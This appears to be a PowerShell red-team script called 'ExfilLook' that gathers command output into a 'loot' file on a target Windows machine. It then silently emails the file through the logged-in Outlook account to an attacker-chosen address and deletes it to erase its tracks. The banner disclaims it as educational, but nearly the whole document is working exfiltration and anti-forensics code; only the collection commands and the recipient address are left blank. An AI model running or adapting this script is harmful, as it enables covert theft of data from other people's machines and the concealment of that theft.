@"
__         __   ____   _        ___      __     ____     ______      _____      ___     _    ___________________________________________________________________________
|  \    ___) \  \  /  / \    ___) (_    _) \   |    \   |      )    (     )    (   \   | )  /                                                                           |
|   |  (__    \  \/  /   |  (__     |  |    |  |     |  |     /      \   /      \   |  |/  /      This tool is made for educational purposes only and should only       |
|   |   __)    |    |    |   __)    |  |    |  |     |  |    (   ()   ) (   ()   )  |     (       be tested on machines that you have permission to target.             |
|   |  (___   /  /\  \   |  (      _|  |_   |  |__   |  |__   \      /   \      /   |  |\  \                                                                            |
|__/       )_/  /__\  \_/    \____(      )_/      )_/      )___)    (_____)    (___/   |_)  \_____v.2.0_________________________________________________________________|

"@

# ---------------------------------------------------------------------------------- #
# Step 1: Manually fill out the required information (OPTIONAL)                      #
# ---------------------------------------------------------------------------------- #

# The email to send the loot to
$listenerEmail = ""

$emailSubject = "ExfilLook"
$emailBody = "Proof of Concept"

# The full path for the file that'll contain the loot
$filePath = "./loot234289763972623.txt" 

# The commands to fetch the desired information
$commands = ""


# ---------------------------------------------------------------------------------- #
# Step 2: Test to see if the required processes are enabled on the machine           #
# ---------------------------------------------------------------------------------- #

# Check for Internet connectivity
if (Test-Connection -ComputerName 8.8.8.8 -Count 4 -Quiet) {

    # Check if Outlook is enabled
    $registryPath = "HKLM:\Software\Clients\Mail\Microsoft Outlook"
    $outlookEnabled = Test-Path -Path $registryPath

    if ($outlookEnabled) {
        #Microsoft Outlook is enabled on this system.
    } else {
        #ERROR: Microsoft Outlook is not enabled on this system. 
        exit 1
    }

} else {
    #ERROR: Machine isn't connected to the Internet.
    exit 1
}

# ---------------------------------------------------------------------------------- #
# Step 3: Check if an account is logged in on Outlook                                #          
# ---------------------------------------------------------------------------------- # 

# Create an Outlook application object
$outlook = New-Object -ComObject Outlook.Application

# Check if there are any active sessions (logged-in accounts)
if ($outlook.Session.Accounts.Count -gt 0) {
    Write-Host "An account is logged in to Outlook."
    foreach ($account in $outlook.Session.Accounts) {
        # There's an account logged in
    }
} else {
    Write-Host "No accounts are currently logged in to Outlook."
    exit 1
}

# Release the Outlook COM object
#[System.Runtime.Interopservices.Marshal]::ReleaseComObject($outlook) | Out-Null

# ---------------------------------------------------------------------------------- #
# Step 4: Enumerate the target data and redirect it to a text file                   #
# ---------------------------------------------------------------------------------- #

# Create a new text file
New-Item -ItemType File -Path $filePath -Force

# Execute commands and redirect output to new text file
$commands > $filePath # FILL OUT

# ---------------------------------------------------------------------------------- #
# Step 5: Exfiltrate the text file containing the loot using Outlook                 #
# ---------------------------------------------------------------------------------- #

$ATTACHMENT = $filePath
$outlook = New-Object -comobject outlook.application
$email = $outlook.CreateItem(0)
$email.To = $listenerEmail 
$email.Subject = $emailSubject
$email.Body = $emailBody
$email.Attachments.add($ATTACHMENT) | Out-Null
$email.Send()
$outlook.Quit()

# ---------------------------------------------------------------------------------- #
# Step 5: Erase our tracks from the target machine                                   #
# ---------------------------------------------------------------------------------- #

del $filePath
exit 0
